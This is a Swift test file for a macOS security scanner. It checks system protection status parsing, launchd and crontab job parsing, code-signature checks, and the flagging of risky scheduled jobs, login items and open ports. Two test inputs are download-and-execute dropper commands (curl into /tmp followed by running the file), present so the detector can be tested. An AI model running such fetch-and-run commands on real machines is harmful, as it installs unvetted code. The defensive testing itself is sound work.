import Foundation
import Testing
@testable import CleanMacOS

struct SecurityScanTests {
    @Test func readsProtectionStatusFromCommandOutput() throws {
        let checks = Dictionary(uniqueKeysWithValues: SecurityScan.checks.map { ($0.name, $0) })
        let sip = try #require(checks["System Integrity Protection"])
        let gatekeeper = try #require(checks["Gatekeeper"])
        let fileVault = try #require(checks["FileVault"])
        let firewall = try #require(checks["Firewall"])
        #expect(sip.state("System Integrity Protection status: enabled.\n") == true)
        #expect(sip.state("System Integrity Protection status: unknown (Custom Configuration).\n") == false)
        #expect(gatekeeper.state("assessments enabled\n") == true)
        #expect(gatekeeper.state("assessments disabled\n") == false)
        #expect(fileVault.state("FileVault is On.\n") == true)
        #expect(fileVault.state("FileVault is Off.\n") == false)
        #expect(firewall.state("Firewall is enabled. (State = 1)\n") == true)
        #expect(firewall.state("Firewall is disabled. (State = 0)\n") == false)
        #expect(firewall.state("") == nil)
    }

    @Test func securityUpdatesCountAsOnUntilTurnedOff() {
        #expect(SecurityScan.installsSecurityUpdates([:]))
        #expect(SecurityScan.installsSecurityUpdates(["ConfigDataInstall": true, "CriticalUpdateInstall": true]))
        #expect(!SecurityScan.installsSecurityUpdates(["ConfigDataInstall": false, "CriticalUpdateInstall": true]))
        #expect(!SecurityScan.installsSecurityUpdates(["CriticalUpdateInstall": false]))
    }

    @Test func spotsTemporaryAndSharedFoldersOnlyAtThePathStart() {
        #expect(SecurityScan.usesSharedFolder("/tmp/agent"))
        #expect(SecurityScan.usesSharedFolder("/private/var/folders/xy/T/run"))
        #expect(SecurityScan.usesSharedFolder("/Users/Shared/helper"))
        #expect(SecurityScan.usesSharedFolder("curl -o /tmp/x https://example.com; sh /tmp/x"))
        #expect(!SecurityScan.usesSharedFolder("/Users/me/project/tmp/run.sh"))
        #expect(!SecurityScan.usesSharedFolder("~/tmp/run.sh"))
    }

    @Test func readsTheProgramLaunchdRuns() {
        #expect(ScheduledJobsService.arguments(of: ["ProgramArguments": ["/bin/sh", "-c", "x"]]) == ["/bin/sh", "-c", "x"])
        #expect(ScheduledJobsService.arguments(of: ["Program": "/usr/bin/a", "ProgramArguments": ["a", "--flag"]]) == ["/usr/bin/a", "--flag"])
        #expect(ScheduledJobsService.arguments(of: ["Program": "/usr/bin/a"]) == ["/usr/bin/a"])
        #expect(ScheduledJobsService.arguments(of: [:]).isEmpty)
        #expect(ScheduledJobsService.parseCrontab("0 9 * * * /tmp/x --quiet\n").map(\.arguments) == [["/tmp/x", "--quiet"]])
    }

    @Test func reportsOnlyItemsWithProblemsMostSeriousFirst() {
        let job = { (label: String, arguments: [String]) in
            ScheduledJob(label: label, source: .userAgent, command: arguments.joined(separator: " "), schedule: "", plistPath: nil,
                         logPaths: [], isLoaded: true, pid: nil, lastExitStatus: nil, arguments: arguments)
        }
        let jobs = [job("signed", ["/usr/bin/caffeinate"]), job("brew", ["/opt/homebrew/bin/python3", "/Users/me/x.py"]),
                    job("dropper", ["/bin/sh", "-c", "curl -o /tmp/x example.com; /tmp/x"]), job("empty", []),
                    job("mackit", ["/Applications/MacKit.app/Contents/MacOS/MacKit"]), job("hidden", ["/Users/me/Library/.agent"])]
        let items = [LoginItem(name: "Gone", path: "/Applications/Gone.app", isEnabled: true, isMissing: true),
                     LoginItem(name: "Off", path: "/Applications/Off.app", isEnabled: false, isMissing: false),
                     LoginItem(name: "Unknown", path: nil, isEnabled: true, isMissing: true)]
        let ports = [ListeningPort(port: 3000, pid: 7, command: "node", user: "me", addresses: ["127.0.0.1"]),
                     ListeningPort(port: 7000, pid: 8, command: "server", user: "me", addresses: ["*"]),
                     ListeningPort(port: 5000, pid: 8, command: "server", user: "me", addresses: ["*"])]
        let signatures: [String: SecurityProblem] = [
            "/opt/homebrew/bin/python3": .unidentified, "/Applications/Gone.app": .missing, "/Applications/Off.app": .unsigned,
            "/usr/local/bin/node": .unsigned, "/srv/server": .unsigned, "/Applications/MacKit.app/Contents/MacOS/MacKit": .unidentified,
        ]
        let executables: [pid_t: String] = [7: "/usr/local/bin/node", 8: "/srv/server"]
        let findings = SecurityScan.findings(jobs: jobs, loginItems: items, ports: ports, ownPath: "/Applications/MacKit.app",
                                             executablePath: { executables[$0] }, signature: { signatures[$0] })
        #expect(findings.map(\.name) == ["dropper", "hidden", "server", "brew", "Gone"])
        #expect(findings.map(\.problems) == [[.sharedFolder], [.hiddenFile], [.unsigned], [.unidentified], [.missing]])
        #expect(findings.map(\.kind) == ["Your Agent", "Your Agent", "Ports 5000, 7000", "Your Agent", "Login Item"])
    }

    @Test func checksRealCodeSignatures() throws {
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }
        let script = folder.appendingPathComponent("job.sh").path
        let signed = folder.appendingPathComponent("signed.sh").path
        let blob = folder.appendingPathComponent("blob").path
        try "#!/bin/sh\necho hi\n".write(toFile: script, atomically: true, encoding: .utf8)
        try "#!/bin/sh\necho hi\n".write(toFile: signed, atomically: true, encoding: .utf8)
        try "not code\n".write(toFile: blob, atomically: true, encoding: .utf8)
        #expect(CommandRunner.run("/usr/bin/codesign", ["--force", "--sign", "-", signed]).status == 0)

        #expect(SecurityScan.signatureProblem("/bin/ls") == nil)
        #expect(SecurityScan.signatureProblem(script) == nil)
        #expect(SecurityScan.signatureProblem(blob) == .unsigned)
        #expect(SecurityScan.signatureProblem(signed) == .unidentified)
        #expect(SecurityScan.signatureProblem(folder.appendingPathComponent("gone").path) == .missing)

        let handle = try #require(FileHandle(forWritingAtPath: signed))
        try handle.seek(toOffset: 15)
        handle.write(Data("o".utf8))
        try handle.close()
        #expect(SecurityScan.signatureProblem(signed) == .invalidSignature)
    }
}
